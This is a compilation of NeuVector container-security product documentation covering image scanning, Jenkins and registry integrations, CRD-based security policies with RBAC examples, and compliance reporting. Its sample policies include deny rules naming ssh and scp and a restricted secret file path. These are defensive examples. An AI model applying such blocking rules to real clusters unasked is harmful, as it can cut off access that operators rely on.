This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet)CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections.

NeuVector supports two types of build-phase scanning: registry and local. For registry scanning, the NeuVector controller and scanner must be able to connect to the registry to pull the image.  To trigger a build-phase scan, the plug-in (e.g. Jenkins) must be able to connect to the Controller or Allinone. Note: The default REST API port for plug-ins to call the scanner is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  Make sure there is a NeuVector scanner container deployed and properly configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separately from the allinone or controller, and is included in the sample deployment yaml files.  You can download the plug-in from the Jenkins Plug-in Manager. Other plug-ins are accessible through the catalogs of the build tool, or on the NeuVector github page. The Bamboo scanner is available at https://github.com/neuvector/bamboo-plugin/releases/tag/1.0.1. The CircleCI ORB is available at https://github.com/neuvector/circleci-orb and through the CircleCI ORB catalog.  Local Build-Phase Scanning​  For local scanning, the NeuVector scanner will try to scan the image on a local host (or a host reachable by the remote host docker command).  For Kubernetes or OpenShift-based local scanning, remove the commented-out section of the sample scanner deployment yaml file, shown in the Deploying NeuVector sections. The commented out section looks like this:   env: # Commented out sections are required only for local build-phase scanning # - name: SCANNER_DOCKER_URL # value: tcp://192.168.1.10:2376 - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # volumeMounts: # - mountPath: /var/run/docker.sock # name: docker-sock # readOnly: true # volumes: # - name: docker-sock # hostPath: # path: /var/run/docker.sock restartPolicy: Always   For Docker-native local scanning, follow the instructions for Docker scanner deployments in the Docker Production deployments section for the scanner.  Local Build-Phase Scanning - Scanner Only (No Controller Required)​  NeuVector supports standalone scanner deployments for local image scanning (which does not require a Controller). Certain plug-in's such as the CircleCI ORB have an option to dynamically deploy a scanner when a build job requires image scanning, then remove the scanner when the results are sent back through the ORB. These dynamic scanner deployments are automatically invoked through the plug-in if supported.  Please see the scanner section for more details on stand alone scanners.

Developers, DevOps, DevSecOps, and Security teams can collaborate to automate security policies for new or updated applications deployed to production. CRDs can also be used to enforce global security policies across multiple Kubernetes clusters.  note CRDs are supported in Kubernetes 1.11 and later. Deploying the NeuVector security rule CRD in earlier versions may not result in an error, but the CRD will not be processed.  CRD's can be used to support many use cases and workflows:  Define security policy during application development, to push into production.Learn behavior using NeuVector and export the CRD for review before pushing into production.Migrate security policies from staging to production clusters.Replicate rules across multiple replicated clusters in hybrid or multi-clouds.Enforce global security policies (see examples for this at bottom).  CRD's bring many benefits, including:  Define / declare the security policy, as code.Version and track the security policies the same as application deployment manifests.Define the allowed behavior of any application including network, file and process behavior.  Supported Resource Types​  NeuVector supports two kinds of custom resource definitions. They are the NvSecurityRule and NvClusterSecurityRule. The difference among the two comes down to the boundary set by the definition of the scope. The NvSecurityRule resource is scoped at the namespace level, whereas the NvClusterSecurityRule is scoped at the cluster level. Either of the resource types can be configured in a yaml file and can be created during deployment, as shown in the deployment instructions and examples for NeuVector.  The significance of the NvSecurityRule resource type with a scope of namespace lies in the enforcement of the configured domain of the target group, which must match the configured namespace in the NeuVector’s CRD security policy. This provides enforcement to prevent unwanted cross-namespace policy creation which affect a Target-Group policy rule.  For the NvClusterSecurityRule custom resource definition, this has a cluster level scope, and therefore, does not enforce any namespace boundary on a defined target. However, the user-context that is used for importing the CRD-yaml file must have the necessary permissions to access or reside in the same namespace as the one configured in the CRD-yaml file, or the import will be rejected.  Enabling CRD SupportAs described in the Kubernetes and OpenShift deployment sections (Deploying NeuVector), the appropriate clusterroles and clusterrole bindings for custom resources and NvSecurityRules should be added first.  Then NvSecurityRule and NvClusterSecurityRule should be created using the sample yaml in those sections. NeuVector CRDs can now be deployed.

This configured Namespace is then used to enforce the configured Target, which must reside in this namespace configured in the NeuVector security policy. When rolebinding a defined clusterrole, this can be used to bind to a Kubernetes User or Group. The two clusterrole resources types that NeuVector supports are NvSecurityRule and NvClusterSecurityRule.  Rolebinding &amp; Clusterolebinding with 2 Users in different Namespaces to a Clusterrole (NvSecurityRules &amp; NvClusterSecurityRules resources)  The following illustrates a scenario creating one Clusterrole containing both resources (NvSecurityRules and NvClusterSecurityRules) to be bound to two different users.  One user (user1) belongs to Namespace (ns1), while the other user (user2) belongs to Namespace (ns2). User1 will Rolebind to this created Clusterrole (nvsecnvclustrole), while User2 is Clusterrolebind to this same Clusterrole (nvsecnvclustrole).  The key takeaway here is to illustrate that using Rolebinding, this will have Namespace-Level-Scope, whereas using Clusterrolebinding will have Cluster-Level-Scope. User1 will Rolebind (Namespace-Level-Scope), and User2 will be Clusterrolebind (Cluster-Level-Scope). This matters most during RBAC enforcement based on the scope-level that bounds the created users access.  Example using 2 different types of defined yaml files, and the effect of using each user  Create a Clusterrole containing both NvSecurityRules and NvClusterSecurityRules resources. Note: Notice that this clusterrole has 2 resources configured, nvsecurityrules and nvclustersecurityrules.

One for the NvSecurityRules, and the other for the NvClusterSecurityRules resource.

Therefore, importing test yaml file (kubectl create –f nvsecurity.yaml should be allowed since this yaml file configuration has the NvSecurityRules resource and the Namespace that this user is bound to.  If there is an attempt to import the test yaml file (nvclustersecurity.yaml ) however, this will be denied since the import CRD yaml file is defined with the resource NvClusterSecurityRules that has a Cluster-Scope, but user1 was Rolebind with a Namespace-Scope. Namespace-scope has a lower privilege than Cluster-Scope. Therefore, Kubernetes RBAC will deny such a request.  Example Error Message:  Error from server (Forbidden): error when creating &quot;rbacnvclustnamespacengtargnvclustingress.yamltmp&quot;: nvclustersecurityrules.neuvector.com is forbidden: User &quot;user1&quot; cannot create resource &quot;nvclustersecurityrules&quot; in API group &quot;neuvector.com&quot; at the cluster scope   Next, we can switch the user-context to user2 with a broader scope privilege, cluster-level-scope. This user2 has a Clusterrolebinding that is not Namespace bound, but has a cluster-level-scope, and associates with the NvClusterSecurityRules resource.  Therefore, using user2 to import either yaml file (nvsecurity.yaml or nvclustersecurity.yaml) will be allowed, since this user’s Clusterrolebinding is not restricted to either resource NvSecurityRules (Namespace-Scope) or NvClusterSecurityRules (Cluster-Scope).

There are multiple benefits to allow these customizations.  First, this allows the same rules to be applied on multiple Kubernetes environments, allowing synchronization among clusters.Second, this allows preemptive rules deployment prior to the applications coming online, which provides a proactive and effective security rules deployment workflow.Third, this allows the policymode to change from an evaluation one (such as Discover or Monitor), to one that protects the final staging environment.  These CRD rules within a yaml file can be imported into the NeuVector security platform through the use of Kubernetes CLI commands such as 'kubectl create –f crd.yaml'. This empowers the security team to tailor the security rules to be applied upon various containers residing in the Kubernetes environment.  For example, a particular yaml file can be configured to enable the policymode to Discover or Monitor a particular container named nv.alpine.ns1 in a staging cluster environment. Moreover, you can limit ssh access for a configured target container nv.alpine.ns1. to another container nv.redhat.ns2.  Once all the necessary tests and evaluations of such security rules are deemed correct, then you can migrate this to a production cluster environment simultaneous to the application deployments by using the NeuVector policy migration feature, which will be discussed later in this section.

Example of an exported group yaml file with the NvsecurityRule resource type   kind: NvSecurityRule metadata: name: nv.nginx-pod.neuvector namespace: neuvector spec: egress: [] file: [] ingress: [] process: [] target: selector: criteria: - key: service op: = value: nginx-pod.neuvector - key: domain op: = value: neuvector name: nv.nginx-pod.neuvector policymode: Discover   Exported groups without the defined criteria as domain=xx (Namespace) are exported with a Resource-Type NvClusterSecurityRule and a Namespace as default. Examples of Exported groups without a Namespace are external, container, etc.  Example of an exported group yaml file with the NvClusterSecurityRule resource type   kind: NvClusterSecurityRule metadata: name: egress namespace: default spec: egress: [] file: #File path profile applicable to the Target group only, and only applies to self-learned and user create groups - app: - vi - cat behavior: block_access filter: /etc/mysecret #Only vi and cat can access this file with “block_access”. recursive: false ingress: - selector: criteria: - key: service op: = value: nginx-pod.neuvector - key: domain op: = value: neuvector name: nv.nginx-pod.neuvector #Group Name action: allow applications: - Apache - ElasticSearch name: egress-ingress-0 #Policy Name ports: tcp/9400 process: #Process profile applicable to the Target group only, and only applies to self-learned and user create groups. - action: deny #Possible values are deny and allow name: ls path: /bin/ls #This example shows it denies the ls command for this target. target: selector: criteria: - key: service op: = value: nginx-pod.demo name: egress #Group Name policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ingress namespace: demo spec:   note The CRD import behavior ignores the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists.

Unsupported Export Group-Types  FederatedIP-Based (unsupported for learned service IP only, custom user created IP groups are supported)  Import Scenarios  The import will create new groups in the destination system if the groups do not yet exist in the destination environment, and the currently used Kubernetes user-context has the necessary permissions to access the namespaces configured in the CRD-yaml file to be imported.If the imported group exists in the destination system with different criteria or values, the import will be rejected.If the imported group exists in the destination system with identical configurations, we will reuse the existing group with different type.

It has an ingress policy that does not allow any external connections (outside your cluster) to ssh into your containers. It also denies all containers from using the ssh process. This defined global behavior applies to all containers. The second part is a NvSecurityRule for alpine services: The target is a service called nv.alpine.default in the 'default' namespace. Because it belongs to the all containers, it will inherit the above network policy and process rule. It also adds rules that don't not allow connections of HTTP traffic through port 80 to an external network. Also it not allow the running of the scp process.  Note that for service nv.alpine.default (defined as nv.xxx.yyy where xxx is the service name like alpine, yyy is the namespace like default) we can define policy mode that it is set to. Here it is defined as Protect mode (blocking all abnormal activity).  Overall since nv.alpine.defult is in protect mode, it will deny containers from running ssh and scp, and also will deny ssh connections from external or http to external.  If you change the nv.alpine.defult policymode to monitor, then NeuVector will just log it when scp/ssh is invoked, or there are ssh connections from external or http to external.  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: containers namespace: default spec: egress: [] file: [] ingress: - selector: criteria: [] name: external action: deny applications: - SSH name: containers-ingress-0 ports: tcp/22 process: - action: deny name: ssh path: /bin/ssh target: selector: criteria: - key: container op: = value: '*' name: containers policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.alpine.default namespace: default spec: egress: - selector: criteria: [] name: external action: deny applications: - HTTP name: external-egress-0 ports: tcp/80 file: [] ingress: [] process: - action: deny name: scp path: /bin/scp target: selector: criteria: - key: service op: = value: alpine.default - key: domain op: = value: default name: nv.alpine.default policymode: Protect kind: List metadata: null   To allow, or whitelist a process such as a monitoring process to run, just add a process rule with action: allow for the process name, and add the path.

But container images may contain open source code over which you don't have a full control. Many vulnerabilities in open source projects have been reported, and you may decide to use these libraries with vulnerabilities or not after scanning the images and reviewing the vulnerability information for them.  The NeuVector Vulnerability Scanner Jenkins plugin can scan the images after your image is built in Jenkins. The plug-in source and latest documentation can be found here on the NeuVector GitHub page.  The plug-in supports two scan modes. The first is &quot;Controller &amp; Scanner&quot; mode. The second is the standalone scanner mode. You can select the scan mode in the project configuration page. By default, it uses the &quot;Controller &amp; Scanner&quot; mode.  For the &quot;Controller &amp; Scanner&quot; mode, you need to deploy the NeuVector controller and scanner in the network. To scan the local image (the image on the Jenkins machine), the &quot;Controller &amp; Scanner&quot; needs to be installed on the same node where the image exists.  For the standalone scanner mode, the Docker run-time must be installed on the same host with Jenkins. Also, add the jenkins user to the docker group.  sudo usermod -aG docker jenkins   Jenkins Plugin Installation​  First, go to Jenkins in your browser to search for the NeuVector plug-in. This can be found in:  -&gt; Manage Jenkins -&gt; Manage Plugins -&gt; Available -&gt; filter -&gt; search NeuVector Vulnerability Scanner -&gt;  Select it and click `install without restart.'  Deploy the NeuVector Controller and Scanner container if you haven't already done so on a host reachable by the Jenkins server. This can be on the same server as Jenkins if desired. Make a note of the IP address of the host where the Controller is running. Note: The default REST API port is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  In addition, make sure there is a NeuVector scanner container deployed standalone and configured to connect to the Controller (if Controller is being used).  There are two scenarios for image scanning, local and registry scanning.  Local Image Scan. If you use the plugin to scan local images (before pushing to any registries), you can scan on the same host as the controller/scanner or configure the scanner to access the docker engine on a remote host.Registry Image Scan. If you use the plugin to scan registry images (after pushing to any registries, but as part of the Jenkins build process), the NeuVector Scanner can be installed on any node in the network with connectivity between the registry, NeuVector Scanner, and Jenkins.  Global Configuration in Jenkins​  After installing the plugin, find the ‘NeuVector Vulnerability Scanner’ section in the global configuration page (Jenkins ‘Configure System’). Enter values for the NeuVector Controller IP, port, username, and password. You may click the ‘Test Connection’ button to validate the values. It will show ‘Connection Success’ or an error message.  The timeout minutes value will terminate the build step within the time entered. The default value of 0 means no timeout will occur.  Click the ‘Add Registry’ to enter values for the registry you will use in your project. If you will be only scanning local images, you don’t need to add a registry here.  Scenario 1: global configuration example for local image scan    Scenario 2: global configuration example for registry image scan  For global registry configuration, follow the instructions above for local, then add the registry details as below.    Standalone Scanner​  Running Jenkins scan in standalone mode is a lightweight way to scan image vulnerabilities in the pipeline. Scanner is dynamically invoked and no installaton of controller setup is required. This is especially useful when scaning an image before it is pushed to a registry. It also has no limit on how many scan tasks can run at the same time.  In order to run vulnerability scan in standalone mode, the Jenkins plugin need pull the scanner image to the host where the agent is running, so you need enter NeuVector Scanner registry URL, image repository, and the credential if needed, in NeuVector plugin configuration page.  The scan result can also be submitted to the controler and used in the admission control function. In this case, you do need a controller setup and specify how to connect to the controller in NeuVector plugin configuration page.  Local Configuration for scanning a remote Docker Host​  Prerequisites for Local Scan on a Remote Docker HostTo enable NeuVector to scan an image that is not on the same host as the controller/allinone:  Make sure the docker run-time api socket is exposed via TCPAdd the following environment variable to the controller/allinone: SCANNER_DOCKER_URL=tcp://192.168.1.10:2376  Project Configuration​  In your project, choose the 'NeuVector Vulnerability Scanner' plugin from the drop down menu in the 'Add build step.' Check the box &quot;Scan with Standalone scanner&quot; if you want to do the scan in the standalone scanner mode. By default, it uses &quot;Controller &amp; Scanner&quot; mode to do the scan.  Choose Local or a registry name which is the nickname you entered in global config. Enter the repository and image tag name to be scanned. You may choose Jenkins default environment variables for the repository or tag, e.g. $JOB_NAME, $BUILD_TAG, $BUILD_NUMBER. Enter the values for the number of high or medium, and for any name of the vulnerabilities present to fail the build.  After the build is finished, a NeuVector report will be generated. It will show the scan details and errors if any.  Scenario 1: local configuration example    Scenario 2: registry configuration example    Jenkins Pipeline​  For the Jenkins pipeline project, you may write your own pipeline script directly, or click the ‘pipeline syntax’ to generate the script if you are new to the pipeline style task.    Select the NeuVector Vulnerability Scanner from the drop-down, configure it, and Generate the script.    Copy the script into your Jenkins task script.  Scenario 1: Simple local pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'Local', repository: 'your_username/your_image' \\} ...   Scenario 2: Simple registry pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'your_registry', repository: 'your_username/your_image' \\} ...   Additional Stages​  Add your own pre- and post- image scan stages, for example in the Pipeline stage view example below.

GCP supports using a service account to access GCR. Here are the steps to enable a service account for GCR and use it to trigger repository scans from NeuVector.  Start in NeuVector, where one first sets up a new registry:    By selecting Google Container Registry as the repo type, this panel is customized to accept the input required to use your GCR.  Name - Here’s where you give this particular repo entry a name of your choosing. It’s merely to identify it in the NeuVector interface later on.Registry - This is the first place where you’ll want to be sure the correct data is collected from your GCR instance. While the example of https://gcr.io is the most common, we will want to be sure it accurately reflects how your GCR was set up in GCP. It might be https://us.gcr.io for example. We’ll go check it in the next section.JSON Key - As is pretty self-evident, this will be a JSON-formatted key. And, as you’re probably seeing a pattern set up for, we’ll be finding that via GCP.Filter - Be mindful that you will likely need to replace any filters here with the actual name of the repo. Again, that’s in the GCR interface.   Now let’s head on over to that GCR screen in GCP. Much of what we need is right here on this page.  A. See the “gcr.io” under Hostname? That’s what belongs in item #2, Registry in the NeuVector interface. (Don’t forget the https:// part) B. The ID of the repo is actually under the top level project. This is what you will be using in #3, Filter. See example of env-demo below.    The JSON Key leads us to explore another very important step, and that takes us to the IAM &amp; Admin section of GCP where we will create (or confirm the setting of) a Service Account. See below:    Once you enter the data for the first step of creating a service account, you need to press the “CREATE” button to get step 2 to be willing to accept input.    Be sure to select Basic —&gt; Viewer for the access. If you have an existing service account, ensure that the access is set this way. (Hint: Even access permissions that appear to be more powerful don’t seem to allow for proper access. Don't skip this step.  Once you’ve done this step, you can breeze past Step 3 and proceed with creating the Service Account.  If you don’t immediately land on the info panel for your new service account, be sure to go there on the Service Accounts list. See figure 5 below.    Click “ADD KEY” —&gt; “Create New Key”    As you have already concluded, JSON is the go-to here. Selecting “CREATE” will result in a file that you can download in your browser. The contents of this file should be pasted into the 3, JSON Key field in NeuVector; see figure 1.  Before you get too excited there’s one more thing to ensure. In order for the scanner in NeuVector to use the API to scan and protect your images, said API must be enabled in your GCP account. You can either enable it via the command line via  gcloud services enable artifactregistry.googleapis.com   Or you can use the GCP gui. Head to “API Library” and search for “Artifact Registry API” and ensure it is turned on for your project. See figure 7.    You should be set! See figure 8 below for a properly-configured registry using the data from our example:    Obtain the Access Token Using the REST API​  The NeuVector REST API may be used to authenticate using the service account. The below example uses gcloud to obtain the access token.

In the Assets menu for Nodes or Containers, enable Auto-Scan by clicking on the Vulnerabilities tab for a node or container, then Auto-Scan (appears in upper right) to scan all running containers, nodes, and platform including newly started ones once they start running. You can also select a container or node and scan it manually.  You can click on each vulnerability name/CVE that is discovered to retrieve a description of it, and click on the inspect arrow in the popup to see the detailed description of the vulnerability.    The auto-scan will also be triggered when ever there is an update to the NeuVector CVE database. Please see the section Updating the CVE Database for details.

See the Security Policy -&gt; Admission Control section for details.  Please see the section Security Policy -&gt; Response Rules for instructions for creating automated responses to vulnerabilities detected either during registry scanning, run-time scanning, or CIS benchmarks. Responses can include quarantine, webhook notification, and suppression.  Federated Registries for Distributed Image Scanning Results​  The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage. See the multi-cluster section for more details.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size. Please see the multiple scanners section for more details.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value.

This requires configuration of the connection to the controller (exposed API). The Harbor adapter calls controller endpoint to trigger a scan, which can scan automatically on push. Interrogation services can be used for periodic scans. Scan results from Federation Primary controllers ARE propagated to remote clusters.  note There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).  Deploying the NeuVector Registry Adapter​  The 5.2 Helm chart contains options to deploy the registry adapter for Harbor. It can also be pulled manually from the neuvector/registry-adapter repo on Docker Hub. Options also include setting the Harbor registry request protocol and the basic authentication secret name.  After deployment of the adapter, it is necessary to configure this in Harbor.    The adapter endpoint must be entered, and the adapter connects to the controller, which is typically exposed as a service externally so the adapter can connect to it. In addition, authentication credentials for a valid NeuVector user must be entered.  Scanning Images from a Harbor Registry​  After successful deployment and connection to a controller, an image scan can be manually or automatically triggered from Harbor.    Periodic scans (scheduled) can be configured through Interrogation Services in Harbor, to make sure the latest CVE database is used to rescan images in registries.    Scan results can be viewed directly in Harbor.

Add or edit registries to be scanned. Use the Filter to define repositories or subsets of images to be scanned. If your registry requires access through a proxy, this can be configured in Settings -&gt; Configuration.    The registry will be scanned according to a schedule, which is configurable. By default, only new or updated images will be scanned. If you want to re-scan all applicable images whenever the CVE database is updated, select the Rescan After CVE DB Update button when configuring the registry. You can also select Layered Scan to show vulnerabilities by each layer in the image (note: layered scans can take longer and consume more resources to complete).  After the scan is completed you will see the results below it. Click on the repository/tag to see vulnerabilities and click on the vulnerability to see more info. You can also download the report in a CSV file or see the results in the Event logs.    The scan results include vulnerabilities by image layer, if this option was selected during registry/repository configuration, as well the compliance checks results. Click the compliance tab when viewing the scan results for the image to see compliance checks.  Scanning will also discover and list all Modules (ie, an inventory) in the image, as shown below. It will also summarize the vulnerability risk by module and list all vulnerabilities for each module.    Scanning is supported for images on public and private docker registries that are based on Native Docker, Amazon ECR, Redhat/Openshift, jFrog, Microsoft ACR, Sonatype Nexus, Harbor, Google cloud and other registries. The scan report for the image comprises of the vulnerability status of various packages and binaries in the image. The brief summary of the scan report can be sent via webhook using the Response rule configuration in Policy -&gt; Response Rules, or by Syslog by configuring a syslog server in Settings -&gt; Configuration. Results can also be viewed in the Event logs.  At least one repository filter is required (can't be left blank).  Repository filter examples​    Notes:  To scan all image tags, add filter as * or *:*. This works on all registry types except the public docker registry.Repository should be full name if organization is nil for public docker registry or add library before repository as given above.Create a virtual repository and add all local repository to it to scan all tags on a JFrog registry with the subdomain docker access method.Regular expressions can be used in a filter. For example alpine:3.[8|9].* will scan all 3.8.x and 3.9.x images and tags on docker hub.  Registry scan options​  Scan Layers: Provides vulnerability scan result for every image layer separatelyProvides information about commands executed, packages added in the layerImages size of each layer Auto Scan: Auto Scan is only supported with OpenShift imagestream integration. Proper role binding should be configured in advance.When Auto Scan is enabled, as soon as an image is pushed to the registry, the image scan will be scheduled. Periodical Scan: Enable periodic scan to scan periodicallyScan interval can set to be between 5 minutes to every 7 days.Because many Admission Control checks rely on image scan result, enabling periodical scan helps make sure Admission Control has the up-to-date information of the images. Rescan after CVE DB update Enable this option to rescan all images after the vulnerability database is updated.

The controller assigns scanning tasks to each available scanner pod. Scanner pods can be scaled up or down easily as needed using Kubernetes.  Scanner pods should be deployed to separate nodes to spread the workload across different host resources. Remember that a scanner requires enough memory to pull and expand the image, so it should have available to it more than the largest image size to be scanned. If necessary, scanners can be placed on specific nodes or avoid placing multiple pods on one node using standard Kubernetes node labels, taints/tolerations, or node affinity configurations.  By default, NeuVector deploys 2 scanner pods, as part of the sample deployments in the section Deploying NeuVector. These replicasets can be scaled up or down as needed.  The scanner container the latest CVE database and is regularly updated (with 'latest' tag) by NeuVector. The updater redeploys the scanner, forcing a pull of the latest scanner image in order to get the latest CVE database. See the section Updating the CVE Database for more details on the updater.  Please note that in initial releases the presence and status of multiple scanners is only visible in Kubernetes with 'kubectl get pods -n neuvector' and will not be displayed in the web console.  Scan results from all scanners are shown in the Assets -&gt; Registries menu. Additional scanner monitoring features will be added in future releases.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size.  Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet  Scanner auto-scaling is configured in Settings -&gt; Configuration. The minimumScannerPods setting sets the minimum scanner pods running at any time, while the maxScannerPods sets the maximum number of pods that the auto-scaling strategy can scale up to. NOTE: Setting a minimum value will not adjust the original scanner deployment replicaset value. The minimum value will be applied during the first scale up/down event.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value.  Operations and Debugging​  Each scanner pod will query the registries to be scanned to pull down the complete list of available images and other data. Each scanner will then be assigned an image to pull and scan from the registry.  To inspect the scanner behavior, logs from each scanner pod can be examined using  kubectl logs &lt;scanner-pod-name&gt; -n neuvector   ","version":"5.2","tagName":"h3"},{"title":"Performance Planning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/5.2/scanning/scanners#performance-planning","content":" Experiment with varying numbers of scanners on registries with a large number of images to observe the scan completion time behavior in your environment. 2-5 scanners as the replica setting should be sufficient for most cases.  When a scan task is assigned to a scanner, it pulls the image from the registry (after querying the registry for the list of available images). The amount of time it takes to pull the image (download) typically consumes the most time. Multiple scanners can be pulling images from the same registry in parallel, so the performance may be limited by registry or network bandwidth.  Large images will take more time to pull as well as need to be expanded to scan them, consuming more memory. Make sure each scanner has enough memory allocated to it to handle more than the largest expected image (10% more minimum).  Multiple scanner pods can be deployed to the same host/node, but considerations should be made to ensure the host has enough memory, CPU, and network bandwidth for maximizing scanner performance.

CIS Benchmarks automatically run by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  Compliance scan results can be seen for individual Assets in the Registries (for Images), Nodes, and Containers menus by selecting the relevant asset and clicking the Compliance tab.  The Security Risks -&gt; Compliance menu enables consolidated compliance reporting, similar to how the Vulnerabilities menu works.  Security Risks - Compliance and Compliance Profile​  Compliance results are show in the list by Category and Name. Categories include Docker, Kubernetes, OpenShift, and Custom. The names of each item correspond to the CIS benchmark. For example, K.4.2.3 corresponds to the Kubernetes CIS benchmark 4.2.3. Docker benchmarks are preceded with 'D' with the exception of Image related benchmarks, which are preceded by 'I'.  Use the Advanced filter to select compliance checks based on platform, host, namespace or industry standard, as shown below.    After applying the filter, only the relevant CIS benchmarks and custom checks will be shown, and a report can be generated and downloaded. This is how reports for standards such as PCI, HIPAA, GDPR and other standards can be generated.  The following screenshot shows an example of a secret found in an image scan.    Customizing Compliance Templates for PCI, GDPR, HIPAA, NIST and others​  The Compliance profile menu enables customization of the built-in templates for industry standards such as PCI and GDPR. These reports can be generated from the Security Risks -&gt; Compliance menu by selecting one of the standards to filter, then exporting. The NIST profile is for NIST SP 800-190.  To customize any compliance profile, select the industry standard (e.g. PCI), then enable or disable specific checks for that standard. Think of these as compliance 'tags' that are applied to each check in order to generate a compliance report for that industry standard.  Use the Action button to add or remove any compliance tag from that check.    In addition, you can select which 'Assets' are considered to be part of the compliance reports by clicking on the Assets tab. By default, all compliance templates are applied to Images, Nodes and Containers.    Use the Action button to add or remove compliance templates for assets.  Images. Select the standard(s) to be reported for Images.Nodes. Select the standard(s) to be reported for Nodes (hosts).Containers. Select the stadard(s) to be reported for Containers.  Alternatively, instead of restricting by the above criteria, compliance templates can be restricted to certain Namespaces. If this box is checked and namespace(s) added, reports will be generated for all assets which apply to these namespaces. This can be useful if, for example, the PCI template should only report on assets for namespaces which container PCI in-scope (applicable) workloads.    After the templates and assets are customized (if desired) in the Security Risks -&gt; Compliance Profiles menu, reports can be generated in the Security Risks -&gt; Compliance menu by opening the advanced filter and selecting the compliance template desired. For example, selecting GDPR will filter the display and reports for only the GDPR profile.  Secrets Auditing​  NeuVector checks for over 40 common types of secrets as part of the image compliance scans and run-time scans. In addition, custom compliance scripts can be configured for containers or hosts, and the DLP packet inspection feature can be used to check for secrets in network payloads.  The results for secrets auditing can be found in the Compliance section of image scans (Assets -&gt; Registries), containers (Assets -&gt; Containers), nodes (Assets -&gt; Nodes), and the compliance management menu (Security Risks -&gt; Compliance).

Best practices for managing vulnerabilities in NeuVector include:  Scan during the build-phase, failing the build if there are critical vulnerabilities 'with fix available.' This forces developers to address fixable vulnerabilities before storing in registries.Scan staging and production registries continuously to look for newly discovered vulnerabilities. Vulnerabilities with fixes available can be required to be fixed immediately, or a grace period allowed to provide time to remediate them.Configure Admission Control rules to block deployments into production based on criteria such as critical/high, fix available, and reported date.Continuously scan the production nodes/hosts, containers, and orchestration platform for vulnerabilities for newly discovered vulnerabilities. Implement responses based on criticality/severity that can be webhook alerts (that contact security and developer), quarantine container, or start a grace period for remediation.Ensure running containers are in Monitor or Protect mode with appropriate whitelist rules to 'virtually patch' vulnerabilities to prevent any exploit in production.Scan distroless and PhotonOS based images.  The Dashboard in NeuVector presents a summary risk score which includes vulnerabilities, which can be used to reduce risk from vulnerabilities. See how to improve the risk score for more details.  The other main tool for reviewing, filtering, and reporting on vulnerabilities is in the Security Risks menu.  Security Risks Menu - Vulnerabilities​  This menu combines the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting.  The Vulnerabilities menu provides a powerful explorer tool to:  Make it easy to filter for viewing or downloading of reports, by typing in a search string or using the advanced filter next to the box. The advanced filter allows users to filter vulnerabilities by fix available (or not available), urgency, workloads, service, container, nodes or namespace names.Understand the Impact of vulnerabilities and compliance checks by clicking on the impact row and reviewing remediation and impacted images, nodes, or containers.View the Protection Status (exploit risk) of any vulnerability or compliance issue to see if there are NeuVector Run-Time security protections (rules) enabled for impacted nodes or containers.'Accept' a vulnerability/CVE after it has been reviewed to hide it from views and suppress it from reports.    Use the filter box to enter a string match, or use the advanced filter next to it to select more specific criteria, as shown below. Downloaded PDF and CSV reports will show only the filtered results.    Selecting any CVE listed provides additional details about the CVE, remediation, and which images, nodes, or containers are Impacted. The Protection State icon (circle) shows various colors to indicate a rough percentage of the impacted items which are 